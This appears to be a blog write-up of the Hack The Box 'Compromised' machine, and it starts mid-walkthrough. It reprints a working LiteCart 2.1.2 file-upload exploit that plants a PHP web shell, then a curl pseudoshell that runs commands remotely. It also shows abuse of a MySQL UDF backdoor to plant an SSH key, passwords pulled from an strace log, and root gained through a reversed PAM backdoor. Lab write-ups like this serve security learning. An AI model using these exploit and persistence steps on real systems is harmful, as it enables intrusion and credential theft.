                                                <table class="rouge-table">
                                                    <tbody>
                                                        <tr>
                                                            <td class="rouge-gutter gl">
                                                                <pre class="lineno">
1
</pre>
                                                            <td class="rouge-code">
                                                                <pre>

pwn("uname -a");
                                                                </pre>
                                                </table>
                                            </code>
                                </div>
                            </div>
                            <li>To <code class="language-plaintext highlighter-rouge">this</code> :</li>
                            <div class="language-bash highlighter-rouge">
                                <div class="highlight">
                                    <code>
                                                <table class="rouge-table">
                                                    <tbody>
                                                        <tr>
                                                            <td class="rouge-gutter gl">
                                                                <pre class="lineno">
1
</pre>
                                                            <td class="rouge-code">
                                                                <pre>

pwn($_REQUEST['c']);
                                                                </pre>
                                                </table>
                                            </code>
                                </div>
                            </div>
                            <img src="/hackthebox/compromised/local5.png" class="port" class="py-3" class="width=" 100%"
                                height="255" alt="Compromised">
                            <hr class="my-0">
                            <h1>Then edit the <code class="language-plaintext highlighter-rouge">45267.py</code> to
                                this:</h1>
                            <div class="language-bash highlighter-rouge">
                                <div class="highlight">
                                    <code>
                                                <table class="rouge-table">
                                                    <tbody>
                                                        <tr>
                                                            <td class="rouge-gutter gl">
                                                                <pre class="lineno">
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
</pre>
                                                            <td class="rouge-code">
                                                                <pre>

#Exploit Title: LiteCart 2.1.2 - Arbitrary File Upload
# Date: 2018-08-27
# Exploit Author: Haboob Team
# Software Link: https://www.litecart.net/downloading?version=2.1.2
# Version: 2.1.2
# CVE : CVE-2018-12256

# 1. Description
# admin/vqmods.app/vqmods.inc.php in LiteCart 2.1.2 allows remote authenticated attackers 
# to upload a malicious file (resulting in remote code execution) by using the text/xml 
# or application/xml Content-Type in a public_html/admin/?app=vqmods&doc=vqmods request.

# 2. Proof of Concept

#!/usr/bin/env python
import mechanize
import cookielib
import urllib2
import requests
import sys
import argparse
import random
import string
parser = argparse.ArgumentParser(description='LiteCart')
parser.add_argument('-t',
                    help='admin login page url - EX: https://IPADDRESS/admin/')
parser.add_argument('-p',
                    help='admin password')
parser.add_argument('-u',
                    help='admin username')
args = parser.parse_args()
if(not args.u or not args.t or not args.p):
    sys.exit("-h for help")
url = args.t
user = args.u
password = args.p

br = mechanize.Browser()
cookiejar = cookielib.LWPCookieJar()
br.set_cookiejar( cookiejar )
br.set_handle_equiv( True )
br.set_handle_redirect( True )
br.set_handle_referer( True )
br.set_handle_robots( False )
br.addheaders = [ ( 'User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1' ) ]
response = br.open(url)
br.select_form(name="login_form")
br["username"] = user
br["password"] = password
res = br.submit()
response = br.open(url + "?app=vqmods&doc=vqmods")
one=""
for form in br.forms():
    one= str(form).split("(")
    one= one[1].split("=")
    one= one[1].split(")")
    one = one[0]
cookies = br._ua_handlers['_cookies'].cookiejar
cookie_dict = {}
for c in cookies:
    cookie_dict[c.name] = c.value
bypass = open('dedsec.php', 'r').read()

files = {
        'vqmod': ("dedsec.php", bypass, "application/xml"),
        'token':one,
        'upload':(None,"Upload")
    }
response = requests.post(url + "?app=vqmods&doc=vqmods", files=files, cookies=cookie_dict)
r = requests.get(url + "../vqmod/xml/dedsec.php?c=id")
if r.status_code == 200:
    print "Shell => " + url + "../vqmod/xml/dedsec.php"
else:
    print "Sorry something went wrong"
                                                                </pre>
                                                </table>
                                            </code>
                                </div>
                            </div>
                            <li>Let's run the script again and we get the link to the code <code
                                    class="language-plaintext highlighter-rouge">execution</code></li>
                            <div class="language-bash highlighter-rouge">
                                <div class="highlight">
                                    <code>
                                                                        <table class="rouge-table">
                                                                            <tbody>
                                                                                <tr>
                                                                                    <td class="rouge-gutter gl">
                                                                                        <pre class="lineno">
1
                        </pre>
                                                                                    <td class="rouge-code">
                                                                                        <pre>
                        
python 45267.py -t http://10.10.10.207/shop/admin/ -p 'theNextGenSt0r3!~' -u admin
                                                                                        </pre>
                                                                        </table>
                                                                    </code>
                                </div>
                            </div>
                            <img src="/hackthebox/compromised/local6.png" class="port" class="py-3" class="width=" 100%"
                                height="450" alt="">
                            <hr class="my-2">
                            <li>Let's open the link on <code
                                    class="language-plaintext highlighter-rouge">firefox</code>.</li>

                            <img src="/hackthebox/compromised/web9.png" class="port" class="py-3" class="width=" 100%"
                                height="255" alt="Compromised">

                            <li>we get this <code class="language-plaintext highlighter-rouge">output</code>
                                uid=33(www-data) gid=33(www-data) groups=33(www-data)</li>
                            <h2>alright this works, lets create a <code
                                    class="language-plaintext highlighter-rouge">pseudoshell</code> quick called <code
                                    class="language-plaintext highlighter-rouge">dedsec.sh</code> :</h2>
                            <div class="language-bash highlighter-rouge">
                                <div class="highlight">
                                    <code>
                                                <table class="rouge-table">
                                                    <tbody>
                                                        <tr>
                                                            <td class="rouge-gutter gl">
                                                                <pre class="lineno">
1
2
3
4
5
6
7
8
9
10
</pre>
                                                            <td class="rouge-code">
                                                                <pre>

#!/bin/bash

echo "x for exit"
input=""
while [ "$input" != "x" ]  
do
    echo -n "> "
    read input
    curl -XPOST http://10.10.10.207/shop/vqmod/xml/dedsec.php --data-urlencode "c=$input"
done
                                                                </pre>
                                                </table>
                                            </code>
                                </div>
                            </div>
                            <li>we are <code class="language-plaintext highlighter-rouge">App</code></li>
                            <li>We can now read <code class="language-plaintext highlighter-rouge">user.txt</code> but
                                the contents inside looks to be <code
                                    class="language-plaintext highlighter-rouge">encrypted</code>.</li>
                            <li>Now we do the decryption process of PS credential by importing the <code
                                    class="language-plaintext highlighter-rouge">CliXml module</code>.</li>

                                    <div class="language-bash highlighter-rouge">
                                        <div class="highlight">
                                            <code>
                                                        <table class="rouge-table">
                                                            <tbody>
                                                                <tr>
                                                                    <td class="rouge-gutter gl">
                                                                        <pre class="lineno">
1
2
3
4
5
        </pre>
                                                                    <td class="rouge-code">
                                                                        <pre>
PS C:\windows\system32> $credential = Import-CliXml -Path U:\Users\app\user.txt
$credential = Import-CliXml -Path U:\Users\app\user.txt
PS C:\windows\system32> $credential.GetNetworkCredential().Password
$credential.GetNetworkCredential().Password
7cfd50f6bc34db3204898f1505ad9d70
                                                                        </pre>
                                                        </table>
                                                    </code>
                                        </div>
                                    </div>

                                    <h4>change <code class="language-plaintext highlighter-rouge">permissions</code> and run .</h4>
                                                
                                    <div class="language-bash highlighter-rouge">
                                        <pre><code style="color: white;">
    chmod +x ./dedsec.sh
    ./dedsec.sh
                                    </code></pre>
                                    </div>

                                    <img src="/hackthebox/compromised/local7.png" class="port" class="py-3" class="width=" 100%" height="255" alt="Compromised">

                                    <h4>lets <code class="language-plaintext highlighter-rouge">enumerate</code> now:</h4>
                                    <li>let's cat the <code class="language-plaintext highlighter-rouge">/etc/passwd</code> file</li>
                                    
                                    <img src="/hackthebox/compromised/local8.png" class="port" class="py-3" class="width=" 100%" height="255" alt="Compromised">



                                    <li>hmm, boxname is <code class="language-plaintext highlighter-rouge">"Compromised"</code> and we get mysql creds and mysql has <code class="language-plaintext highlighter-rouge">/bin/bash</code> in /etc/passwd...</li>
                                    <li>lets <code class="language-plaintext highlighter-rouge">google</code> "mysql backdoor"...</li>

                                    <li>I found the interesting <code class="language-plaintext highlighter-rouge">articles</code></li>
                                    <li>Link : <a href="https://pure.security/simple-mysql-backdoor-using-user-defined-functions/">MySQL Backdoor using User Defined Functions (UDF)</a></li>
                                    <li>So lets look at udf in our <code class="language-plaintext highlighter-rouge">pseudoshell</code></li>
            
                                    <div class="language-bash highlighter-rouge">
                                        <pre><code style="color: white;">
    mysql -u root -pchangethis -e "select * from mysql.func;"
                                    </code></pre>
                                    </div>


                                    <img src="/hackthebox/compromised/local9.png" class="port" class="py-3" class="width=" 100%" height="255" alt="Compromised">

                                    <li>alright we found the <code class="language-plaintext highlighter-rouge">udf</code> called <code class="language-plaintext highlighter-rouge">"exec_cmd"</code></li>
                                    <li class="py-2">lets try executing a simple <code class="language-plaintext highlighter-rouge">command</code></li>


                                    <div class="language-bash highlighter-rouge">
                                        <pre><code style="color: white;">
    mysql -u root -pchangethis -e "select exec_cmd('id')"
                                    </code></pre>
                                    </div>

                                    <img src="/hackthebox/compromised/local10.png" class="port" class="py-3" class="width=" 100%" height="255" alt="Compromised">

                                    <li>It's <code class="language-plaintext highlighter-rouge">worked</code>, we got the response:</li>

                                    <h3>What we can do now add our public key to <code class="language-plaintext highlighter-rouge">authorized</code> keys</h3>

                                    <li class="py-2">first create a <code class="language-plaintext highlighter-rouge">public</code> and private key on your <code class="language-plaintext highlighter-rouge">kali</code> machine:</li>

                                    <div class="language-bash highlighter-rouge">
                                        <pre><code style="color: white;">
    ssh-keygen -t ed25519 -f ./dedsec
                                    </code></pre>
                                    </div>

                                    <img src="/hackthebox/compromised/local11.png" class="port" class="py-3" class="width=" 100%" height="255" alt="Compromised">


                                    <li class="py-2">What we can do now copy the contents of <code class="language-plaintext highlighter-rouge">dedsec.pub</code> and put it in the <code class="language-plaintext highlighter-rouge">authorized</code> keys of mysql account with the <code class="language-plaintext highlighter-rouge">pseudoshell</code> you have.</li>

                                    <div class="language-bash highlighter-rouge">
                                        <pre><code style="color: white;">
    mysql -u root -pchangethis -e "select exec_cmd('mkdir /var/lib/mysql/.ssh')"
    mysql -u root -pchangethis -e "select exec_cmd('echo ssh-ed25519 XXX root@d3dsec > /var/lib/mysql/.ssh/authorized_keys')"
                                    </code></pre>
                                    </div>



                                    <img src="/hackthebox/compromised/local12.png" class="port" class="py-3" class="width=" 100%" height="255" alt="Compromised">


                                    <h2>Now we can <code class="language-plaintext highlighter-rouge">ssh</code> into the box:</h2>

                                    <div class="language-bash highlighter-rouge">
                                        <pre><code style="color: white;">
    chmod 600 dedsec
    ssh -i dedsec mysql@10.10.10.207
                                    </code></pre>
                                    </div>


                                    <img src="/hackthebox/compromised/local13.png" class="port" class="py-3" class="width=" 100%" height="255" alt="Compromised">


                                    <h1>Enumerate : </h1>
                                    <li class="py-2">Enumerate the <code class="language-plaintext highlighter-rouge">home</code> folder:</li>
                                    <div class="language-bash highlighter-rouge">
                                        <pre><code style="color: white;">
    grep -nrli sysadmin // -> we want to find anything that involves sysadmin
                                    </code></pre>
                                    </div>

                                    <img src="/hackthebox/compromised/local14.png" class="port" class="py-3" class="width=" 100%" height="255" alt="Compromised">

                                    <div class="language-bash highlighter-rouge">
                                        <pre><code style="color: white;">
    cat strace-log.dat | grep password // -> Trying To Grep passwords Easily
                                    </code></pre>
                                    </div>


                                    <img src="/hackthebox/compromised/local15.png" class="port" class="py-3" class="width=" 100%" height="255" alt="Compromised">


                                    <li>We find the password Of <code class="language-plaintext highlighter-rouge">sysadmin</code></li>


                                    <div class="language-bash highlighter-rouge">
                                        <pre><code style="color: white;">
    22227 03:11:09 execve("/usr/bin/mysql", ["mysql", "-u", "root", "--password=3*NLJE32I$Fe"], 0x55bc62467900 /* 21 vars */) = 0
                                    </code></pre>
                                    </div>

                                    <li><code class="language-plaintext highlighter-rouge">username</code> = sysadmin</li>
                                    <li>password = <code class="language-plaintext highlighter-rouge">3*NLJE32I$Fe</code></li>

                                    <li>Now change the user with <code class="language-plaintext highlighter-rouge">sysadmin</code> with the password <code class="language-plaintext highlighter-rouge">3*NLJE32I$Fe</code></li>
                                    <li>And also get the user.txt</li>

                                    <img src="/hackthebox/compromised/local16.png" class="port" class="py-3" class="width=" 100%" height="255" alt="Compromised">


                                    <h1>Privilege escalation : </h1>
                                    <li>Now look at the <code class="language-plaintext highlighter-rouge">modified</code> files between <code class="language-plaintext highlighter-rouge">14.07</code> and today:</li>

                                    <div class="language-bash highlighter-rouge">
                                        <pre><code style="color: white;">
    find / -newermt "2020-07-14" ! -newermt "2020-09-14" -type f 2>/dev/null
                                    </code></pre>
                                    </div>
                            

                                    <img src="/hackthebox/compromised/local17.png" class="port" class="py-3" class="width=" 100%" height="255" alt="Compromised">

                                    <li>hmm, <code class="language-plaintext highlighter-rouge">/lib/x86_64-linux-gnu/security/pam_unix.so</code> is strange... why is there a <code class="language-plaintext highlighter-rouge">/lib/x86_64-linux-gnu/security/.pam_unix.so</code> ?</li>
                                    <li class="py-2">maybe another <code class="language-plaintext highlighter-rouge">backdoor</code> in pam and /lib/x86_64-linux-gnu/security/.pam_unix.so is a <code class="language-plaintext highlighter-rouge">backup</code> For hackers who hack the <code class="language-plaintext highlighter-rouge">server</code>?</li>
                                    <li>lets use <code class="language-plaintext highlighter-rouge">Ghidra</code>To analize this file.</li>
                                    <li class="py-2">But first download the <code class="language-plaintext highlighter-rouge">pam_unix.so</code> to our machine with <code class="language-plaintext highlighter-rouge">scp</code></li>


                                    <div class="language-bash highlighter-rouge">
                                        <pre><code style="color: white;">
    scp sysadmin@10.10.10.207:/lib/x86_64-linux-gnu/security/pam_unix.so ./pam_unix.so
    #password = 3*NLJE32I$Fe
                                    </code></pre>
                                    </div>

                                    <h1>looking at the functions, we find the important <code class="language-plaintext highlighter-rouge">authenticate</code> function</h1>
                                    <li>And in there we find the string backdoor.</li>

                                    <img src="/hackthebox/compromised/ghidra.png" class="port" class="py-3" class="width=" 100%" height="255" alt="Compromised">

                                    <li>This means, if our <code class="language-plaintext highlighter-rouge">password</code> matches the backdoor string, we can get <code class="language-plaintext highlighter-rouge">root</code>.</li>
                                    <li>Now lets reverse the <code class="language-plaintext highlighter-rouge">backdoor</code> string.</li>
                                    <li>Ghidra Has a option to convert -> <code class="language-plaintext highlighter-rouge">Char Sequence</code></li>
                                    <li>Lets Convert both <code class="language-plaintext highlighter-rouge">backdoor _0_8_</code> & <code class="language-plaintext highlighter-rouge">backdoor _8_7_</code> Values.</li>

                                    <img src="/hackthebox/compromised/ghidra1.png" class="port" class="py-3" class="width=" 100%" height="255" alt="Compromised">

                                    <img src="/hackthebox/compromised/ghidra2.png" class="port" class="py-3" class="width=" 100%" height="255" alt="Compromised">


                                    <li>hmm, its give us a <code class="language-plaintext highlighter-rouge">password</code> let's check it is correct or not: <code class="language-plaintext highlighter-rouge">zlke~U3Env82m2-</code></li>

                                    <div class="language-bash highlighter-rouge">
                                        <pre><code style="color: white;">
    su root
    # password =  zlke~U3Env82m2-
                                    </code></pre>
                                    </div>

                                    <img src="/hackthebox/compromised/root.png" class="port" class="py-3" class="width=" 100%" height="255" alt="Compromised">


                            <p>And we pwned it â¦â¦.</p>
                            <p>
                                If u liked the writeup.Support a Student to Get the <code
                                    class="language-plaintext highlighter-rouge">OSCP-Cert</code>
                                <a href="https://0xdedinfosec.github.io/tabs/donation/" target="_blank">Donation for
                                    OSCP</a>
                            </p>
                            <h1 id="resources">Resources</h1>
                            <table>
                                <thead>
                                    <tr>
                                        <th>Topic
                                        <th>
                                            Url
                                            <tbody><tr><td>45267.py</td><td><a href="https://www.exploit-db.com/exploits/45267" target="_blank">https://www.exploit-db.com/exploits/45267</a></td></tr>
                                                <tr><td>disable_functions Bypass</td><td><a href="https://packetstormsecurity.com/files/154728/PHP-7.3-disable_functions-Bypass.html" target="_blank">https://packetstormsecurity.com/files/154728/PHP-7.3-disable_functions-Bypass.html</a></td></tr>
                                                <tr><td>pseudoshell</td><td><a href="https://bash.cyberciti.biz/guide/Pseudo_terminal#:~:text=4%20References-,Definition,for%20the%20pseudo%20terminal%20session." target="_blank">https://bash.cyberciti.biz/guide/Pseudo_terminal.</a></td></tr>
                                                <tr><td>MySQL Backdoor</td><td><a href="https://pure.security/simple-mysql-backdoor-using-user-defined-functions/" target="_blank">https://pure.security/simple-mysql-backdoor-using-user-defined-functions/</a></td></tr>
                            </table>
                        </div>
                        <div class="post-tail-wrapper text-muted">
                            <div class="post-tail-bottom d-flex justify-content-between align-items-center pt-5 pb-2">
                                <div class="license-wrapper">
                                    <span class="license-text ml-1 mr-1">
                                        This post is licensed under
                                        <a href="https://creativecommons.org/licenses/by/4.0/">
                                            CC BY 4.0 <i class="fab fa-creative-commons"></i>
                                            <i class="fab fa-creative-commons-by"></i>
                                        </a>
                                    </span>
                                </div>
                                <div class="share-wrapper">
                                    <span class="share-label ml-1 mr-1">Share</span>
                                    <span class="share-icon">
                                        <a href="#" data-toggle="tooltip" data-placement="top" title="Twitter"
                                            target="_blank">
                                            <i class="fa-fw fab fa-twitter mr-1"></i>
                                        </a>
                                        <a href="https://www.facebook.com/dedsecinfoServices/" data-toggle="tooltip"
                                            data-placement="top" title="Facebook" target="_blank">
                                            <i class="fa-fw fab fa-facebook-square mr-1"></i>
                                        </a>
                                        <a href="#" data-toggle="tooltip" data-placement="top" title="Telegram"
                                            target="_blank">
                                            <i class="fa-fw fab fa-telegram mr-1"></i>
                                        </a>
                                        <i class="fa-fw fas fa-link mr-1 small" onclick="copyLink()"
                                            data-toggle="tooltip" data-placement="top" title="Copy link"></i>
                                    </span>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                <div id="panel-wrapper" class="col-xl-3 pl-2 topbar-down">
                    <div class="access">
                        <div id="access-lastmod" class="post mb-4">
                            <h3 data-toc-skip>Recent Update</h3>
                            <ul class="post-content pl-0 pb-1 ml-1 mt-2">
                                <li>
                                    <a href="/posts/htb-time/">Hackthebox Time writeup</a>
                                </li>
                                <li>
                                    <a href="/posts/htb-jewel/">Hackthebox Jewel writeup</a>
                                </li>
                                <li>
                                    <a href="/posts/htb-reel2/">Hackthebox Reel2 writeup</a>
                                </li>
                                <li>
                                    <a href="/posts/htb-doctor/">Hackthebox Doctor writeup</a>
                                </li>
                                <li>
                                    <a href="/posts/htb-compromised/">Hackthebox Compromised writeup</a>
                                </li>
                            </ul>
                        </div>
                        <div id="access-tags">
                            <h3 data-toc-skip>Trending Tags</h3>
                            <div class="d-flex flex-wrap mt-3 mb-1 mr-3">
                                <a class="post-tag" href="/tags/cve/">CVE</a>
                                <a class="post-tag" href="/tags/linpeas/">LinPEAS</a>
                                <a class="post-tag" href="/tags/mysql-backdoor/">MySQL Backdoor</a>
                                <a class="post-tag" href="/tags/server-side-template-injection/">Server-Side Template
                                    Injection</a>
                                <a class="post-tag" href="/tags/ftp/">FTP</a>
                                <a class="post-tag" href="/tags/sireprat/">SirepRAT</a>
                                <a class="post-tag" href="/tags/jackson/">Jackson</a>
                                <a class="post-tag" href="/tags/gtfobins/">GTFO-Bins</a>
                                <a class="post-tag" href="/tags/pypi-server/">pypi-server</a>
                                <a class="post-tag" href="/tags/email-extractor/">email-extractor</a>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <div class="row">
                <div id="post-extend-wrapper" class="col-12 col-lg-11 col-xl-8">
                    <div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4">
                        <div class="post-navigation d-flex justify-content-between">
                            <a href="/posts/htb-jewel/" class="btn btn-outline-primary">
                                <p>Hackthebox Jewel writeup</p>
                            </a>
                            <a href="/posts/htb-reel2/" class="btn btn-outline-primary">
                                <p>Fortress Reel2 writeup</p>
                            </a>
                        </div>
                        <!-- Disqus  -->
                        <script id="dsq-count-scr" src="//0xdedinfosec.disqus.com/count.js" async></script>
                        <div id="disqus_thread"></div>
                        <script>
                            var disqus_config = function () {
                                this.page.url = 'https://0xdedinfosec.github.io/posts/htb-compromised/';
                                this.page.identifier = '/posts/htb-compromised/';
                            };
                            (function () {
                                var d = document, s = d.createElement('script');
                                s.src = 'https://0xdedinfosec.disqus.com/embed.js';
                                s.setAttribute('data-timestamp', +new Date());
                                (d.head || d.body).appendChild(s);
                            })();
                        </script>
                        <noscript>Please enable JavaScript to view the <a
                                href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>

                        <!-- Disqus end -->
                        <div id="related-posts" class="mt-4 mb-2 mb-sm-4 pb-2">
                            <h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3>
                            <div class="card-deck mb-4">
                                <div class="card">
                                    <a href="/posts/htb-jewel/">
                                        <div class="card-body">
                                            <span class="timeago small">
                                                Oct 29, 2020 <i class="unloaded">2020-10-29T00:00:00+00:00</i>
                                            </span>
                                            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox Jewel writeup</h3>
                                            <div class="text-muted small">
                                                <p>information Column Details Name Jewel IP 10.10.10.211 Points 30 Os
                                                    Linux ...</p>
                                            </div>
                                        </div>
                                    </a>
                                </div>
                                <div class="card">
                                    <a href="/posts/hackthebox-reel2/">
                                        <div class="card-body">
                                            <span class="timeago small">
                                                Oct 05, 2020 <i class="unloaded">2020-10-05T00:00:00+00:00</i>
                                            </span>
                                            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox Reel2 writeup</h3>
                                            <div class="text-muted small">
                                                <p>information@Sauna:~$ Column Details Name Reel2 IP 10.10.10.210 Points
                                                    40 Os Windo...</p>
                                            </div>
                                        </div>
                                    </a>
                                </div>
                                <div class="card">
                                    <a href="/posts/htb-doctor/">
                                        <div class="card-body">
                                            <span class="timeago small">
                                                Sep 28, 2020 <i class="unloaded">2020-09-28T00:00:00+00:00</i>
                                            </span>
                                            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox Doctor writeup</h3>
                                            <div class="text-muted small">
                                                <p>Information@openadmin:~$ Column Details Name Doctor IP 10.10.10.209
                                                    Points 20 Os ...</p>
                                            </div>
                                        </div>
                                    </a>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script>
            <script type="text/javascript">
                const observer = lozad();
                observer.observe();
            </script>
            <footer class="d-flex w-100 justify-content-center">
                <div class="d-flex justify-content-between align-items-center">
                    <div class="footer-left">
                        </p>
                    </div>
                    <p class="mb-0">
                        Â© 2020 <a href="https://www.facebook.com/dedsecinfoServices/">Dedinfosec</a>
                        . <span data-toggle="tooltip" data-placement="top"
                            title="The blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License.">All
                            rights reserved.</span>
                        <script>
                            (function (i, s, o, g, r, a, m) {
                                i['GoogleAnalyticsObject'] = r;
                                i[r] = i[r] || function () {
                                    (i[r].q = i[r].q || []).push(arguments)
                                }
                                    ,
                                    i[r].l = 1 * new Date();
                                a = s.createElement(o),
                                    m = s.getElementsByTagName(o)[0];
                                a.async = 1;
                                a.src = g;
                                m.parentNode.insertBefore(a, m)
                            }
                            )(window, document, 'script', 'https://www.google-analytics.com/analytics.js', 'ga');
                            ga('create', 'UA-157514490-1', 'auto');
                            ga('send', 'pageview');
                        </script>
            </footer>
        </div>
        <div id="search-result-wrapper" class="d-flex justify-content-center unloaded">
            <div class="col-12 col-xl-11 post-content">
                <div id="search-hints">
                    <h4 class="text-muted">Trending Tags</h4>
                    <a class="post-tag" href="/tags/cve/">CVE</a>
                    <a class="post-tag" href="/tags/linpeas/">LinPEAS</a>
                    <a class="post-tag" href="/tags/mysql-backdoor/">MySQL Backdoor</a>
                    <a class="post-tag" href="/tags/server-side-template-injection/">Server-Side Template Injection</a>
                    <a class="post-tag" href="/tags/ftp/">FTP</a>
                    <a class="post-tag" href="/tags/sireprat/">SirepRAT</a>
                    <a class="post-tag" href="/tags/jackson/">Jackson</a>
                    <a class="post-tag" href="/tags/gtfobins/">GTFO-Bins</a>
                    <a class="post-tag" href="/tags/pypi-server/">pypi-server</a>
                    <a class="post-tag" href="/tags/email-extractor/">email-extractor</a>
                </div>
                <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
            </div>
        </div>
    </div>
    <div id="mask"></div>
    <a id="back-to-top" href="#" class="btn btn-lg btn-box-shadow" role="button">
        <i class="fas fa-angle-up"></i>
    </a>
    <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"
        integrity="sha256-qcLR00zq6pJk4je3MLgAri8Nn+ZumUlXgTKR2H/xCY0=" crossorigin="anonymous"></script>
    <script>
        SimpleJekyllSearch({
            searchInput: document.getElementById('search-input'),
            resultsContainer: document.getElementById('search-results'),
            json: '/assets/data/search.json',
            searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://0xdedinfosec.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>',
            noResultsText: '<p class="mt-5">Oops! No result founds.</p>'
        });
    </script>